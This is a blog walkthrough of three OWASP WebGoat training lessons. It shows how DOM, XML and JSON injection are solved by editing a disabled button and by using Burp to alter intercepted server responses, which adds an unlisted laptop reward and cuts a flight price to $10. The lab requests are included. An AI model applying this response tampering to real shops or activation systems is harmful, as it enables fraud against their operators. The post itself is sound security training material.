---
layout: post
title:  "OWASP BWA WebGoat Challenge Part 3 (Continued)"
date:   2017-01-24 17:00:00 -0500
categories: webgoat
---
# AJAX Security Part 5: Dom Injection
Alright, we're given the following instructions for this challenge:
* Your victim is a system that takes an activation key to allow you to use it.
* Your goal should be to try to get to enable the activate button.
* Take some time to see the HTML source in order to understand how the key validation process works.

Let's take a look at the HTML that defines the ```Activate``` button

```
<input disabled="" id="SUBMIT" value="Activate!" name="SUBMIT" type="SUBMIT">
```

Hmm..disabled? But, what if we just...

```
<input enabled="" id="SUBMIT" value="Activate!" name="SUBMIT" type="SUBMIT">
```

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_3_continued/dom-injection.jpg">

Well, okay! ```¯\_(ツ)_/¯```

# AJAX Security Part 6: XML Injection
We're given the following instructions for this challenge:

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_3_continued/xml-injection.jpg">

Looks like we're probably going to need to fire up Burp and check out some requests. Now I have to be honest, I spent *a lot* of time messing around with requests and trying to see the breadcrumb I was missing. Then I realized that there was an option to capture the response to a given request in Burp...Which it turns out was pretty essential to solving this one. So when I finished typing in my account number (836239), an AJAX request fired out:

```
GET /WebGoat/attack?Screen=59&menu=400&from=ajax&accountID=836239 HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.56.101/WebGoat/attack?Screen=59&menu=400
Cookie: JSESSIONID=C1702A9FE913D04E2F177203213F9149; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
Authorization: Basic dXNlcjp1c2Vy
Connection: close
```

Alright, cool. Looks like it's going to retrieve my list of possible rewards from the webserver. I set Burp to intercept the server response and let it fly. The server did in fact come back with the list of rewards I was allowed to request:

```
HTTP/1.1 200 OK
Content-Length: 136
Connection: close

<root>
<reward>WebGoat Mug 20 Pts</reward>
<reward>WebGoat t-shirt 50 Pts</reward>
<reward>WebGoat Secure Kettle 30 Pts</reward>
</root>
```

But, I felt like I had been good this year. That and I'm pretty sure running 16.04 on my macbook is going to result in a fireball. So let's get a new laptop!

```
HTTP/1.1 200 OK
Content-Length: 136
Connection: close

<root>
<reward>WebGoat Mug 20 Pts</reward>
<reward>WebGoat t-shirt 50 Pts</reward>
<reward>WebGoat Secure Kettle 30 Pts</reward>
<reward>WebGoat Core Duo Laptop 2000 Pts</reward>
</root>
```

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_3_continued/xml-injection-1.jpg">

Cool, it looks like we can select the laptop that wasn't previously on our list of rewards. Let's send it out and see if we can game the system:

```
POST /WebGoat/attack?Screen=59&menu=400 HTTP/1.1
Host: 192.168.56.101
Content-Length: 82

accountID=836239&check1001=on&check1002=on&check1003=on&check1004=on&SUBMIT=Submit
```

S-(e)[u]-rve-(r)[y] says.....

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_3_continued/xml-injection-2.jpg">

Nice!

# AJAX Security Part 7: JSON Injection
JavaScript Object Notation, or JSON, is a data-interchange format that a lot of applications use for passing information back and forth. It is language-independent, which is desirable for applications, clients, and servers talking to each other when it can't be guaranteed that they all use the same backend language. In this challenge, we have a flight to catch:
* You are traveling from Boston, MA- Airport code BOS to Seattle, WA - Airport code SEA.
* Once you enter the three digit code of the airport, an AJAX request will be executed asking for the ticket price.
* You will notice that there are two flights available, an expensive one with no stops and another cheaper one with 2 stops.
* Your goal is to try to get the one with no stops but for a cheaper price. 

At first glance, it looks to me like another case of response interception and alteration. So firing up Burp (or I guess just keeping it open), I intercepted the request for a flight from BOS to SEA. Then I marked the server response to be intercepted and took a look:

```
{
	"From": "Boston",
	"To": "Seattle", 
	"flights": [
		{"stops": "0", "transit" : "N/A", "price": "$600"},
		{"stops": "2", "transit" : "Newark,Chicago", "price": "$300"} 
	]
}
```

Which pops up in the browser like so:

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_3_continued/json-injection-1.jpg">

Alright, lets request again and modify the server's response to see if we can manipulate the return data. I changed the price of our non-stop flight to the affordable price of $10 and forwarded it back to the browser. 

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_3_continued/json-injection-2.jpg">

And, when we send it...Got it! Apparently no server-side checks for validity. Nice.